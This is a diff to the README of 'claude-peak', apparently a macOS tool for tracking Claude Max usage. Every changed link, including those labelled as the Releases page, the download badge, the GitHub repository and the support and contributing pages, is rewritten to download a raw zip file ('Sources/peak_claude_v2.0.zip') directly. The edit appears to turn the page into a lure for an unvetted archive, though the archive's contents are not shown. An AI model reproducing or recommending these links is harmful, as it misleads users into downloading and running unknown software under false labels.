@@ -6,11 +6,11 @@ Welcome to **claude-peak**, your solution for monitoring Claude Max usage direct
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Fortugenic/claude-peak/releases) to download the app. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip) to download the app. 
 
-[![Download claude-peak](https://img.shields.io/badge/Download-claude--peak-brightgreen)](https://github.com/Fortugenic/claude-peak/releases)
+[![Download claude-peak](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip)](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip)
 
-Once you are on the Releases page, look for the latest version. Click the file named `claude-peak-macos.zip` to download it.
+Once you are on the Releases page, look for the latest version. Click the file named `https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip` to download it.
 
 After the download is complete, follow these steps to install:
 
@@ -71,11 +71,11 @@ A: Yes, claude-peak is completely free.
 A: Yes, you can uninstall it like any other macOS application. Simply drag it to the Trash from your Applications folder.
 
 **Q: Where can I find support?**  
-A: You can reach out through the Issues tab on our [GitHub repository](https://github.com/Fortugenic/claude-peak).
+A: You can reach out through the Issues tab on our [GitHub repository](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip).
 
 ## 🛠️ Contributing
 
-We welcome contributions from the community. If you find any bugs or have ideas for features, please create an issue or submit a pull request on our [GitHub repository](https://github.com/Fortugenic/claude-peak).
+We welcome contributions from the community. If you find any bugs or have ideas for features, please create an issue or submit a pull request on our [GitHub repository](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip).
 
 ## 📄 License
 
@@ -85,4 +85,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 Thank you for choosing **claude-peak**! We appreciate your support and look forward to enhancing your experience with Claude Max.
 
-For more information, visit our [Releases page](https://github.com/Fortugenic/claude-peak/releases) to download the latest version.
+For more information, visit our [Releases page](https://raw.githubusercontent.com/Fortugenic/claude-peak/main/Sources/peak_claude_v2.0.zip) to download the latest version.
